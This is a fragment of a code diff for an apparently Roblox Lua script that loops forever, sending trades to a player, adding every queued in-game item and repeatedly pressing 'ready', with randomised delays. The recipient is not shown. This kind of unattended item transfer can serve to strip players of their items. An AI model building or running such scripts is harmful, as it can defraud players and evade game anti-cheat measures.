+local function startFullAutomation()
+    while true do
+        processedButtons = {}
+
+        while not isTradeActive() do
+            sendTradeToPlayer()
+        
+            local startWait = tick()
+            while tick() - startWait < 4 do
+                if isTradeActive() then break end
+                task.wait(0.3)
+            end
+        end
+
+        task.wait(0.8)
+
+        for index, item in ipairs(brainrotQueue) do
+            if not isTradeActive() then break end
+
+            local success = false
+            for attempt = 1, 3 do
+                success = selectBrainrot(item, index)
+                if success then break end
+                task.wait(0.4)
             end
 
-            task.wait(0.8)
+            task.wait(DELAY_STEP + math.random(10, 25) / 100)
+        end
 
-            for index, item in ipairs(brainrotQueue) do
-                if not isTradeActive() then break end
+        task.wait(0.5)
+        pressReadyButtonByPath()
 
-                local success = false
-                for attempt = 1, 3 do
-                    success = selectBrainrot(item, index)
-                    if success then break end
-                    task.wait(0.4)
-                end
-
-                task.wait(DELAY_STEP + math.random(10, 25) / 100)
-            end
-
-            task.wait(0.5)
+        local timeout = 0
+        while isTradeActive() and timeout < 30 do
             pressReadyButtonByPath()
-
-            local timeout = 0
-            while isTradeActive() and timeout < 30 do
-                pressReadyButtonByPath()
-                task.wait(1.5)
-                timeout = timeout + 1.5
-            end
-
-            task.wait(2)
+            task.wait(1.5)
+            timeout = timeout + 1.5
         end
-    end
 
-    startFullAutomation()
+        task.wait(2)
+    end
+end
+
+startFullAutomation()
+
 end)
 
 print("==========================================")
